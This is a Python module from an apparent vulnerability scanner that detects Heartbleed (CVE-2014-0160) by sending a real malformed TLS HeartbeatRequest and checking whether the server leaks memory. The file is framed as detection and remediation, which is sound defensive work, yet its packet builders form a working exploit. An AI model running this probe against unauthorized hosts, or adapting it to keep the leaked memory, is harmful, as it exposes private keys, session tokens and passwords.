#!/usr/bin/env python3
"""
vuln_sweep/checks/heartbleed.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CVE-2014-0160  Heartbleed

Vulnerability:
    A missing bounds check in OpenSSL's TLS HeartbeatRequest handler
    allows an attacker to request up to 64KB of memory from the server
    process per request. The leaked memory may contain private keys,
    session tokens, passwords, and other sensitive data. No authentication
    is required. The attack leaves no trace in server logs.

    Affected: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta.

Detection method:
    We perform a real exploit attempt using raw sockets:

    Step 1 — ClientHello:
        Send a minimal TLS 1.0 ClientHello to initiate the handshake.
        We use TLS 1.0 (0x03 0x01) as the advertised version because
        the Heartbeat extension is negotiated during the handshake and
        was universally supported on TLS 1.0/1.1/1.2 in affected versions.

    Step 2 — ServerHelloDone:
        Read TLS records until we see HandshakeType 0x0e (ServerHelloDone).
        This tells us the server has finished its handshake flight and
        is ready to process extensions including Heartbeat.

    Step 3 — Malformed HeartbeatRequest:
        Send a HeartbeatRequest (TLS ContentType 0x18) that claims a
        payload_length of 16383 (0x3FFF) but contains only 1 real byte.
        A vulnerable OpenSSL server honours the inflated length and reads
        16382 bytes beyond the actual payload from process memory.

    Step 4 — HeartbeatResponse:
        If the server responds with a HeartbeatResponse (ContentType 0x18),
        it leaked memory. Not vulnerable servers either close the connection
        or send a TLS Alert.

    This is a genuine exploit probe — not a version check, not a banner
    grab. The leaked bytes are received but immediately discarded.

References:
    https://nvd.nist.gov/vuln/detail/CVE-2014-0160
    https://heartbleed.com
    https://www.openssl.org/news/secadv/20140407.txt
"""

import os
import socket
import struct
import time

from vuln_sweep.checks.base import (
    CheckResult,
    _tcp_connect,
    _read_response,
    _drain_server_hello,
    _build_tls_client_hello,
    make_vulnerable,
    make_clean,
    make_inconclusive,
)


# ─────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────

CVE  = "CVE-2014-0160"
NAME = "Heartbleed"

# TLS record content types
_TLS_CONTENT_HANDSHAKE  = 0x16
_TLS_CONTENT_ALERT      = 0x15
_TLS_CONTENT_HEARTBEAT  = 0x18

# Heartbeat message types
_HB_REQUEST  = 0x01
_HB_RESPONSE = 0x02

# Inflated payload length — what we claim vs what we send
# We claim 16383 bytes but send 1 byte.
# Vulnerable server echoes back 16382 bytes of process memory.
_CLAIMED_PAYLOAD_LEN = 0x3FFF   # 16383
_ACTUAL_PAYLOAD_LEN  = 1        # one real byte


# ─────────────────────────────────────────────
# Check entry point
# ─────────────────────────────────────────────

def check(host: str, port: int, timeout: int) -> CheckResult:
    """
    Check whether the host is vulnerable to Heartbleed.

    Performs a real HeartbeatRequest probe — sends a malformed
    HeartbeatRequest and checks for a HeartbeatResponse.

    Returns:
        CheckResult with vulnerable=True  if HeartbeatResponse received.
                             vulnerable=False if no HeartbeatResponse.
                             vulnerable=None  if probe could not complete.
    """
    try:
        return _do_check(host, port, timeout)
    except Exception as e:
        return make_inconclusive(CVE, NAME, f"Unexpected error: {e}")


def _do_check(host: str, port: int, timeout: int) -> CheckResult:

    # ── Step 1: Open TCP connection ───────────────────────────
    try:
        sock = _tcp_connect(host, port, timeout)
    except ConnectionRefusedError:
        return make_inconclusive(CVE, NAME, "Connection refused.")
    except socket.timeout:
        return make_inconclusive(CVE, NAME, f"Connection timed out after {timeout}s.")
    except socket.gaierror as e:
        return make_inconclusive(CVE, NAME, f"DNS resolution failed: {e.args[1]}.")
    except OSError as e:
        return make_inconclusive(CVE, NAME, f"Network error: {e.strerror}.")

    try:
        # ── Step 2: Send ClientHello ──────────────────────────
        # Use TLS 1.0 version bytes — widely supported by affected
        # OpenSSL versions and triggers Heartbeat extension negotiation.
        hello = _build_tls_client_hello(
            version = b"\x03\x01",   # TLS 1.0
            ciphers = _heartbleed_ciphers(),
        )
        sock.send(hello)

        # ── Step 3: Drain until ServerHelloDone ───────────────
        # We don't strictly need ServerHelloDone to send the heartbeat,
        # but waiting for it improves reliability across server implementations.
        # Some servers buffer heartbeats received before ServerHelloDone.
        server_hello_done = _drain_server_hello(sock, timeout=timeout)

        # Even without ServerHelloDone we attempt the heartbeat —
        # some servers accept it mid-handshake.

        # ── Step 4: Send malformed HeartbeatRequest ───────────
        heartbeat = _build_heartbeat_request()
        sock.send(heartbeat)

        # ── Step 5: Read response ─────────────────────────────
        # Give the server time to respond — some implementations
        # batch their response with other handshake records.
        response = _read_heartbeat_response(sock, timeout=timeout)

        sock.close()

        # ── Step 6: Analyse response ──────────────────────────
        return _analyse_response(response, server_hello_done)

    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return make_inconclusive(CVE, NAME, f"Probe failed: {e}")


# ─────────────────────────────────────────────
# Packet builders
# ─────────────────────────────────────────────

def _heartbleed_ciphers() -> bytes:
    """
    Cipher suites for the Heartbleed ClientHello.
    Includes a broad set to maximise chance of handshake success
    across all vulnerable server configurations.
    """
    return bytes.fromhex(
        "c014"   # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        "c00a"   # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        "0039"   # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
        "0038"   # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
        "c00f"   # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
        "c005"   # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
        "0035"   # TLS_RSA_WITH_AES_256_CBC_SHA
        "c013"   # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        "c009"   # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        "0033"   # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
        "0032"   # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
        "002f"   # TLS_RSA_WITH_AES_128_CBC_SHA
        "0005"   # TLS_RSA_WITH_RC4_128_SHA
        "0004"   # TLS_RSA_WITH_RC4_128_MD5
        "0000"   # TLS_NULL_WITH_NULL_NULL  (forces server to pick)
    )


def _build_heartbeat_request() -> bytes:
    """
    Build a malformed TLS HeartbeatRequest record.

    Structure of a legitimate HeartbeatRequest:
        ContentType:      0x18 (Heartbeat)
        Version:          0x03 0x02 (TLS 1.1 — works with 1.0/1.2 too)
        RecordLength:     length of HeartbeatMessage
        HeartbeatType:    0x01 (request)
        PayloadLength:    claimed length of payload (2 bytes, big-endian)
        Payload:          actual payload bytes
        Padding:          >= 16 bytes

    The exploit:
        PayloadLength claims _CLAIMED_PAYLOAD_LEN (16383) but only
        _ACTUAL_PAYLOAD_LEN (1) byte of real payload is sent.
        Vulnerable OpenSSL uses PayloadLength to copy memory into
        the response, reading 16382 bytes past the real payload end.
    """
    # HeartbeatMessage body
    hb_message = (
        bytes([_HB_REQUEST])                          # HeartbeatMessageType
        + struct.pack("!H", _CLAIMED_PAYLOAD_LEN)     # inflated payload_length
        + b"A" * _ACTUAL_PAYLOAD_LEN                  # 1 real payload byte
        + b"\x00" * 16                                # minimum padding
    )

    # TLS record wrapping the HeartbeatMessage
    return (
        bytes([_TLS_CONTENT_HEARTBEAT])               # ContentType = 0x18
        + b"\x03\x02"                                 # version TLS 1.1
        + struct.pack("!H", len(hb_message))          # RecordLength
        + hb_message
    )


# ─────────────────────────────────────────────
# Response reader
# ─────────────────────────────────────────────

def _read_heartbeat_response(
    sock:    socket.socket,
    timeout: int,
) -> bytes:
    """
    Read from the socket looking specifically for a Heartbeat record
    (ContentType 0x18) or a TLS Alert (ContentType 0x15).

    Stops reading when:
      - A Heartbeat record is found (vulnerable)
      - A TLS Alert is found (server rejected our heartbeat)
      - Enough data has been read to make a determination
      - Timeout expires

    Returns:
        Raw bytes received (may be empty or contain non-heartbeat data).
    """
    import time

    sock.settimeout(timeout)
    buf      = b""
    deadline = time.time() + timeout

    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk

            # Scan for Heartbeat or Alert records in the buffer
            i = 0
            while i < len(buf) - 4:
                content_type = buf[i]

                if content_type == _TLS_CONTENT_HEARTBEAT:
                    # Found a Heartbeat record — this is the money shot
                    return buf[i:]

                if content_type == _TLS_CONTENT_ALERT:
                    # Server sent a TLS Alert — not vulnerable
                    return buf[i:]

                # Skip this record and advance to the next
                if i + 5 <= len(buf):
                    rec_len = struct.unpack("!H", buf[i+3:i+5])[0]
                    i += 5 + rec_len
                else:
                    break

            # If buffer is large with no Heartbeat, probably not vulnerable
            if len(buf) > 32768:
                break

        except socket.timeout:
            break
        except OSError:
            break

    return buf


# ─────────────────────────────────────────────
# Response analyser
# ─────────────────────────────────────────────

def _analyse_response(
    response:           bytes,
    server_hello_done:  bool,
) -> CheckResult:
    """
    Analyse the raw response bytes and return the appropriate CheckResult.

    A HeartbeatResponse (ContentType 0x18, HeartbeatType 0x02) that
    is larger than our request confirms memory disclosure.

    A TLS Alert (ContentType 0x15) means the server rejected our
    malformed heartbeat — not vulnerable.

    Empty or unrecognised response is inconclusive.
    """
    if not response:
        detail = "No response received after HeartbeatRequest."
        if not server_hello_done:
            detail += (
                " ServerHelloDone was not observed before sending the "
                "probe — server may have rejected the heartbeat mid-handshake."
            )
        return make_inconclusive(CVE, NAME, detail)

    first_byte = response[0]

    # ── Heartbeat record received ─────────────────────────────
    if first_byte == _TLS_CONTENT_HEARTBEAT:

        # Parse the HeartbeatMessage
        # Record: ContentType(1) Version(2) RecordLength(2) Body
        if len(response) < 5:
            return make_inconclusive(
                CVE, NAME,
                "Received truncated Heartbeat record — cannot confirm leak.",
            )

        rec_len  = struct.unpack("!H", response[3:5])[0]
        hb_body  = response[5:5 + rec_len] if len(response) >= 5 + rec_len else response[5:]

        if not hb_body:
            return make_inconclusive(
                CVE, NAME,
                "Received empty Heartbeat record body — cannot confirm leak.",
            )

        hb_type = hb_body[0]

        if hb_type == _HB_RESPONSE:
            # Confirmed: server sent HeartbeatResponse
            payload_len_claimed = struct.unpack("!H", hb_body[1:3])[0] if len(hb_body) >= 3 else 0
            actual_body_len     = len(hb_body) - 3  # subtract type(1) + payload_len(2)

            return make_vulnerable(
                CVE, NAME,
                f"Server returned a HeartbeatResponse with {len(response)} bytes "
                f"(claimed payload_length={payload_len_claimed}, "
                f"body={actual_body_len} bytes). "
                "Memory leak confirmed — the server echoed process memory beyond "
                "the actual payload boundary. "
                "Leaked data may include private keys, session tokens, and plaintext "
                "credentials. Upgrade OpenSSL immediately (to ≥ 1.0.1g or 1.0.2+), "
                "rotate all private keys, reissue certificates, and invalidate "
                "all active session tokens.",
            )

        # HeartbeatRequest echoed back (type 0x01) — unusual but not a leak
        return make_inconclusive(
            CVE, NAME,
            f"Received Heartbeat record with unexpected type 0x{hb_type:02x} "
            "(expected 0x02 HeartbeatResponse). Result inconclusive.",
        )

    # ── TLS Alert received ────────────────────────────────────
    if first_byte == _TLS_CONTENT_ALERT:
        alert_level = response[5]  if len(response) > 5 else 0
        alert_desc  = response[6]  if len(response) > 6 else 0
        return make_clean(
            CVE, NAME,
            f"Server sent TLS Alert (level={alert_level}, desc={alert_desc}) "
            "in response to the malformed HeartbeatRequest. "
            "Server rejected the probe — not vulnerable to Heartbleed.",
        )

    # ── Handshake or other record ─────────────────────────────
    if first_byte == _TLS_CONTENT_HANDSHAKE:
        return make_inconclusive(
            CVE, NAME,
            "Server sent a Handshake record instead of a Heartbeat response. "
            "Heartbeat extension may not be supported or was not negotiated. "
            "Result inconclusive.",
        )

    # ── Unrecognised response ─────────────────────────────────
    return make_inconclusive(
        CVE, NAME,
        f"Received {len(response)} bytes with unrecognised ContentType "
        f"0x{first_byte:02x}. Cannot determine vulnerability. "
        "Try running with --verbose or verify the port is TLS.",
    )